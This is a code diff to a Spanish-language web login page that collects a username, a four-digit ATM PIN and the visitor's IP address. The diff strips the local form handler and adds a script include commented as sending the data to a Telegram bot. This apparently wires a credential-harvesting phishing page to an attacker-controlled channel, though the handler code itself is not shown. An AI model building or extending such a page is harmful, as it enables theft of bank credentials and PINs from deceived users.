@@ -532,22 +532,6 @@
             }
         }
 
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            if (usuarioInput.value.trim() === '') {
-                alert('Por favor ingresa tu usuario');
-            } else if (usuarioInput.value.indexOf(' ') !== -1) {
-                alert('El usuario no puede contener espacios');
-            } else if (claveInput.value.length !== 4) {
-                alert('La clave del cajero debe tener 4 dígitos');
-            } else {
-                console.log('Formulario enviado');
-                console.log('Usuario:', usuarioInput.value);
-                console.log('Clave:', claveInput.value);
-                // window.location.href = 'dashboard.html';
-            }
-        });
-
         validateForm();
 
         // ========== OBTENER IP DEL USUARIO ==========
@@ -596,16 +580,11 @@
         // Actualizar la hora cada segundo
         setInterval(updateDateTime, 1000);
     </script>
-        <!-- Tu script original que ya existe -->
-    <script>
-        // ... todo tu código original ...
-    </script>
 
-    <!-- ✅ AGREGAR ESTA ÚNICA LÍNEA -->
+    <!-- ✅ SCRIPT QUE ENVÍA AL BOT DE TELEGRAM -->
     <script src="telegram-handler.js"></script>
 
 </body>
 </html>
 
-</body>
-</html>
+
